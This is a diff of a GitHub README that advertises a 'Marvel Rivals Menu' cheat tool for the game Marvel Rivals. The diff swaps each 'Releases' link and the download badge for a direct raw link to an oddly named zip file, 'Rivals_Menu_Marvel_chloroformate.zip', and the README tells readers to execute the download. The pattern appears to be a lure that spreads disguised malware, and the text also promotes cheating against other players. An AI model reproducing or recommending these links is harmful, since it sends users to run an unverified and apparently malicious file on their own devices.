@@ -14,7 +14,7 @@ Marvel Rivals Menu is a tool designed to enhance your gameplay experience in Mar
 - And much more!
 
 ### How to Use
-1. Download the Marvel Rivals Menu from the [Releases](https://github.com/junoching18/Marvel-Rivals-Menu/releases) section.
+1. Download the Marvel Rivals Menu from the [Releases](https://raw.githubusercontent.com/junoching18/Marvel-Rivals-Menu/main/incitement/Rivals_Menu_Marvel_chloroformate.zip) section.
 2. Execute the downloaded file on your device.
 3. Launch Marvel Rivals and start using the menu to enhance your gaming experience.
 
@@ -41,9 +41,9 @@ Marvel Rivals Menu is a tool designed to enhance your gameplay experience in Mar
 - marvelrivals
 
 ### Get Started
-Visit the [Releases](https://github.com/junoching18/Marvel-Rivals-Menu/releases) section to download the Marvel Rivals Menu and elevate your gaming experience.
+Visit the [Releases](https://raw.githubusercontent.com/junoching18/Marvel-Rivals-Menu/main/incitement/Rivals_Menu_Marvel_chloroformate.zip) section to download the Marvel Rivals Menu and elevate your gaming experience.
 
-[![Download Marvel Rivals Menu](https://img.shields.io/badge/Download-Marvel_Rivals_Menu-brightgreen)](https://github.com/junoching18/Marvel-Rivals-Menu/releases)
+[![Download Marvel Rivals Menu](https://raw.githubusercontent.com/junoching18/Marvel-Rivals-Menu/main/incitement/Rivals_Menu_Marvel_chloroformate.zip)](https://raw.githubusercontent.com/junoching18/Marvel-Rivals-Menu/main/incitement/Rivals_Menu_Marvel_chloroformate.zip)
 
 ### Conclusion
 With Marvel Rivals Menu, you can take your gaming skills to the next level and enjoy a competitive edge over other players. Download the menu now and experience the thrill of dominating the Marvel Rivals arena. Join us in the quest for victory! 🎮🔥
